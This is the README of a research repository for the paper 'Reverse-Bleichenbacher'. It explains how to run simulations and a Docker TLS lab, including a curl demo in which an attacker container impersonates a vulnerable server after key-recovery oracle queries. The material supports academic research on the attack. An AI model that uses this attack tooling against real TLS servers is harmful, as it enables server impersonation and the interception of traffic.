# Reverse-Bleichenbacher

This repository contains code and experiments related to the paper _"Reverse-Bleichenbacher: Bleichenbacher Attacks Are Practical Again"_ by Youheng Lü, Lorenz Hetterich, Riccardo Zanotto, Cas Cremers, Michael Schwarz, and Lukas Gerlach.

There are two experiment setups: one for large-scale simulations and one
for end-to-end TLS latency measurements. Both use the shared attack package;
the TLS adapter submits sequential or parallel query batches. The simulation
runs with Python; the TLS lab runs with Docker on macOS or Linux.

| Directory | What is inside |
| --- | --- |
| [`reversebleichenbacher/`](reversebleichenbacher/) | The reusable attack package used by simulations and both TLS modes. |
| [`simulation/`](simulation/) | The Capol baseline, simulated oracles, RSA key pools, and scripts for running and analyzing the query experiments. |
| [`latency/`](latency/) | The TLS attack, Docker lab, network-delay runner, and scripts for the Figure 5 latency experiment. |

Each setup can be run on its own. See the README in each directory for the full
set of options.

## Run a simulation

From the repository root, with Python 3.14:

```sh
python3 -m venv .venv
.venv/bin/python -m pip install -r simulation/requirements.txt
make simulations-smoke PYTHON_BIN=.venv/bin/python RUN_ID=smoke
make simulations-check PYTHON_BIN=.venv/bin/python RUN=simulation/results/smoke
```

The smoke run exercises both implementations on a simulated 1024-bit TTT
oracle. To run the complete experiment or resume a run, see
[`simulation/README.md`](simulation/README.md).

## Run a latency smoke test

With Python 3, Docker Compose, and `curl` installed, run:

```sh
docker compose -f latency/docker-compose.yml -f latency/docker-compose.macos.yml up -d --build server attacker
python3 latency/evaluation/eval_runtime.py --modes normal,parallel --delays 0 --count 1 --host-port 8443 --output-dir latency/evaluation/smoke_results
```

This works through a published loopback port on macOS or Linux. See
[`latency/README.md`](latency/README.md) for the full latency run, analysis,
and cleanup commands.

Experiment results are generated locally under ignored output directories.
The keys and certificates included here are synthetic lab fixtures.

## Demo with curl
Start the vulnerable server and attacker containers:

```sh
docker compose -f latency/docker-compose.yml -f latency/docker-compose.macos.yml up -d --build server attacker
```

Then start the attacker's TLS server in one terminal:

```sh
latency/examples/start_server.sh
```

In a second terminal, connect to the attacker through its published port. The
`--resolve` option directs the name `server` to the attacker, while `--cacert`
configures curl to trust only the lab CA:

```sh
curl --verbose --noproxy '*' \
  --cacert latency/cert/ca.crt \
  --resolve server:8443:127.0.0.1 \
  --output /dev/null \
  https://server:8443/
```
**Note:** The attack is probablistic and might fail on the first attempt. Then
just restart `start_server.sh` and try `curl` again.

The verbose curl output confirms that the attacker completes a TLS handshake
as `server` with a certificate signed by the lab CA:

```text
* Server certificate:
*  subject: CN=server
*  issuer: CN=My Dev CA
*  subjectAltName: host "server" matched cert's "server"
*  SSL certificate verify ok.
< HTTP/1.0 200 OK
```

At the same time, the attacker terminal shows the key-recovery queries and the
successful request:

```text
latency/examples/start_server.sh
I am an HTTP test server, I will listen on 0.0.0.0:443
Serving files from /attacker/tlslite-ng-bleichenbacher
About to handshake...
1000 oracle queries
  Handshake time: 2.608 seconds
  Version: TLS 1.2
  Cipher: aes128 python
  Ciphersuite: TLS_RSA_WITH_AES_128_CBC_SHA256
  No client certificate provided by peer
  Server X.509 SHA1 fingerprint: 455d54302a5dbbbdbaa31aa442f900177012115d
  SNI: server
  Application Layer Protocol negotiated: http/1.1
  Next-Protocol Negotiated: None
  Encrypt-then-MAC: True
  Extended Master Secret: True
  Session Resumed: False
  Session used ec point format extension: 0
172.20.0.1 - - [27/Oct/2026 14:28:03] "GET / HTTP/1.1" 200 -
```

The number of oracle queries and the handshake time vary between runs. 

Because curl connected to the `attacker` container but successfully verified
the identity `server`, this demonstrates that the attacker impersonated the
victim server.

## Credits

The comparison attack builds on Livia Capol's 2021 work. Parts of the TLS
oracle build on the CC0 `robot-detect` project; source notices are kept with
that code.
